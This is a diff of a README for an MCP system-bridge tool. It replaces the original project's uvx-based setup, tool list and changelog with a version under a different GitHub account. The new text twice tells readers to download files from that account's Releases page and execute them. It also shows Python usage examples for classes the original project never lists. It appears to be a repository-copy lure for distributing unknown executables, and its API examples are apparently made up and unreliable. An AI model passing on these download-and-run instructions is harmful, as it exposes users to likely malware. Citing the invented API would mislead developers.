@@ -1,108 +1,134 @@
-# MCP System Bridge
+# MCP Sys Bridge 🚀
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/pypi/v/mcp-sys-bridge?color=%2334D058&label=Version)](https://pypi.org/project/mcp-sys-bridge)
-[![Last commit](https://img.shields.io/github/last-commit/leynier/mcp-sys-bridge.svg?style=flat)](https://github.com/leynier/mcp-sys-bridge/commits)
-[![Commit activity](https://img.shields.io/github/commit-activity/m/leynier/mcp-sys-bridge)](https://github.com/leynier/mcp-sys-bridge/commits)
-[![Stars](https://img.shields.io/github/stars/leynier/mcp-sys-bridge?style=flat&logo=github)](https://github.com/leynier/mcp-sys-bridge/stargazers)
-[![Forks](https://img.shields.io/github/forks/leynier/mcp-sys-bridge?style=flat&logo=github)](https://github.com/leynier/mcp-sys-bridge/network/members)
-[![Watchers](https://img.shields.io/github/watchers/leynier/mcp-sys-bridge?style=flat&logo=github)](https://github.com/leynier/mcp-sys-bridge)
-[![Contributors](https://img.shields.io/github/contributors/leynier/mcp-sys-bridge)](https://github.com/leynier/mcp-sys-bridge/graphs/contributors)
+![MCP Sys Bridge](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Python](https://img.shields.io/badge/python-3.8%2B-yellow.svg)
 
-A bridge implementation of the **Model Context Protocol (MCP)** that exposes native operating system features such as clipboard management, URL handling and date information retrieval.
-
----
+Welcome to the **MCP Sys Bridge** repository! This project offers an implementation of the Model Context Protocol (MCP). It serves as a bridge to native OS functionalities such as clipboard management and URL handling. Whether you are a developer looking to integrate system functionalities or an enthusiast exploring automation tools, this library provides the utilities you need.
 
 ## Table of Contents
 
-* [Overview](#overview)
-* [Key Features](#key-features)
-* [Installation](#installation)
-* [Quick Start](#quick-start)
-* [Available Tools](#available-tools)
-* [Changelog](#changelog)
-* [License](#license)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
----
+## Introduction
 
-## Overview
+The **Model Context Protocol (MCP)** is a protocol designed to facilitate interaction between different systems and applications. The **MCP Sys Bridge** acts as a connector, enabling seamless communication between your Python applications and various operating system features. This bridge simplifies the process of accessing clipboard data and managing URLs, making it easier for developers to create efficient and powerful applications.
 
-`mcp-sys-bridge` provides a minimal set of tools for MCP compatible clients, allowing them to interact with the underlying OS in a safe manner.
+## Features
 
----
-
-## Key Features
-
-* 🚀 **URL Opening** — open one or multiple URLs in the default browser.
-* 📋 **Clipboard Support** — copy text directly to the clipboard.
-* 📆 **Date Info** — retrieve detailed information about the current date and time.
-
----
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
+- **Clipboard Management**: Easily read from and write to the system clipboard.
+- **URL Handling**: Open URLs in the default web browser with a simple command.
+- **Automation Ready**: Integrate with automation scripts for enhanced productivity.
+- **Lightweight Library**: Minimal dependencies for quick setup and execution.
+- **Developer-Friendly**: Easy-to-use API for quick implementation.
 
 ## Installation
 
-`mcp-sys-bridge` runs directly with [uvx](https://docs.astral.sh/uv/getting-started/installation);
-no package installation is required. Add the server to your MCP configuration:
+To get started with the **MCP Sys Bridge**, follow these simple steps:
 
-```json
-{
-  "mcpServers": {
-    "mcp-sys-bridge": {
-      "command": "uvx",
-      "args": ["mcp-sys-bridge"]
-    }
-  }
-}
+1. **Clone the repository**:
+   ```bash
+   git clone https://github.com/Sanjaykumar973/mcp-sys-bridge.git
+   ```
+
+2. **Navigate to the project directory**:
+   ```bash
+   cd mcp-sys-bridge
+   ```
+
+3. **Install the required packages**:
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. **Download the latest release** from the [Releases section](https://github.com/Sanjaykumar973/mcp-sys-bridge/releases) and execute the necessary files.
+
+## Usage
+
+Using the **MCP Sys Bridge** is straightforward. Below are some basic examples to help you get started.
+
+### Clipboard Management
+
+To interact with the clipboard, you can use the following methods:
+
+#### Reading from Clipboard
+
+```python
+from mcp_sys_bridge import Clipboard
+
+clipboard_content = Clipboard.get_text()
+print("Clipboard contains:", clipboard_content)
 ```
 
-Ensure `uv` is installed following the [uv documentation](https://docs.astral.sh/uv/getting-started/installation).
+#### Writing to Clipboard
 
----
+```python
+from mcp_sys_bridge import Clipboard
 
-## Quick Start
-
-Start the bridge manually:
-
-```bash
-uvx mcp-sys-bridge
+Clipboard.set_text("Hello, World!")
+print("Text has been copied to clipboard.")
 ```
 
----
+### URL Handling
 
-## Available Tools
+To open a URL in the default web browser:
 
-- `open_urls` — open a list of URLs in the default browser.
-- `copy_to_clipboard` — copy text to the clipboard.
-- `get_current_date_info` — return rich information about the current date such as day number, week number, quarter and more.
+```python
+from mcp_sys_bridge import URLHandler
 
----
+URLHandler.open("https://www.example.com")
+print("Opening URL in the default browser.")
+```
 
-## Changelog
+### Automation Example
 
-### 0.1.4
+You can create scripts to automate tasks. Here’s a simple example that reads the clipboard and opens a URL:
 
-- Defined annotations to declare tools as read-only.
+```python
+from mcp_sys_bridge import Clipboard, URLHandler
 
-### 0.1.3
+url = Clipboard.get_text()
+if url.startswith("http"):
+    URLHandler.open(url)
+    print("Opened URL from clipboard.")
+else:
+    print("Clipboard does not contain a valid URL.")
+```
 
-- Added `get_current_date_info` tool to get comprehensive information about the current date.
+## Contributing
 
-### 0.1.2
+We welcome contributions to the **MCP Sys Bridge**! If you want to help improve this project, please follow these steps:
 
-- Change `open_url` to `open_urls` to open a list of URLs in the default browser.
+1. **Fork the repository** on GitHub.
+2. **Create a new branch** for your feature or bug fix.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make your changes** and commit them.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. **Push to your branch**.
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+5. **Create a pull request** on GitHub.
 
-### 0.1.1
-
-- Improve the `open_url` tool to handle URLs without a scheme and validate that the URL is valid.
-
-### 0.1.0
-
-- Added `open_url` tool.
-- Added `copy_to_clipboard` tool.
-
----
+Your contributions are greatly appreciated!
 
 ## License
 
-MIT License. See [`license`](license).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
+## Links
+
+For the latest releases, visit the [Releases section](https://github.com/Sanjaykumar973/mcp-sys-bridge/releases). Download the necessary files and execute them to start using the MCP Sys Bridge.
+
+Explore the potential of the **MCP Sys Bridge** in your projects and enhance your development experience with powerful system integrations. 
+
+Feel free to reach out with any questions or suggestions. Happy coding!
